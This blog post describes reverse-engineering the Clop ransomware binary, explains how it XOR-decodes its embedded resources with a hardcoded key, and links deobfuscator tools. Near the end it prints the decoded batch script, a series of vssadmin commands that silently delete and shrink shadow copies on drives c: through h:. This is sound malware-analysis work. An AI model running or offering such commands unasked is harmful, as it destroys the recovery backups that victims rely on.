+++
title = "Deobfuscating Clop ransomware resources"
description = "A deobfuscator tool for extracted resources from Clop ransomware"
tags = [
    "ransomware",
    "clop",
    "reverse-engineering"
]
date = "2019-03-31"
categories = [
    "Malware",
    "Reverse Engineering",
]
author = "Dan"
summary = true 
+++

[A colleague](https://github.com/digitalcroqueta) and I reverse-engineered the Clop ransomware binary (with SHA256 hash value `2f29950640d024779134334cad79e2013871afa08c7be94356694db12ee437e2`), and observed that it contained two obfuscated resources:

* SIXSIX
* SIXSIX1

One of them is just the README file that the malware drops all over the disk, so nothing too exciting, but the other is a batch script that deletes the volume shadow copies. Granted, you could just debug it and get it to drop these files, but as a personal challenge I decided to write a deobfuscator based on my analysis of the decompiled code (I looked at it in both Ghidra and IDA Pro, the latter of which was much more helpful in this case). After spending a bit of time labeling each variable/function, this is the relevant decompiled section of code:

<script src="https://gist.github.com/danzek/a5ff18c455101e892d8717654338cae0.js"></script>

Beginning with this decompiled code, I quickly whipped up [a deobfuscator in C++](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp), basically mimicking the decompiled code (with a couple minor shortcuts), which [I've made available on GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp) Shortly thereafter, I decided to write [a Python 3 version](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py) that is much shorter (and cross-platform compatible), which is [now also on my GitHub.](https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py)

The ransomware has a hardcoded "magic" string that it uses to deobfuscate the resources:

```
CHAR clopDecodeResourceSIXSIX1_MagicString[] = "Clopfdwsjkjr23LKhuifdhwui73826ygGKUJFHGdwsieflkdsj324765tZPKQWLjwNVBFHewiuhryui32JKG";
```

From there it iterates over each byte in the file and XORs it by itself and the modulus (remainder) of the current byte offset and `0x42` (decimal value `66`) as an offset/subscript into the magic string:

```
*((BYTE *)hResourceMemory + i) ^= clopDecodeResourceSIXSIX1_MagicString[i % 66];
```

And here's our prize:

```
@echo off
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
```

That's really all there is to it. The rest of the code is mostly just memory management and writing the deobfuscated data to a file.

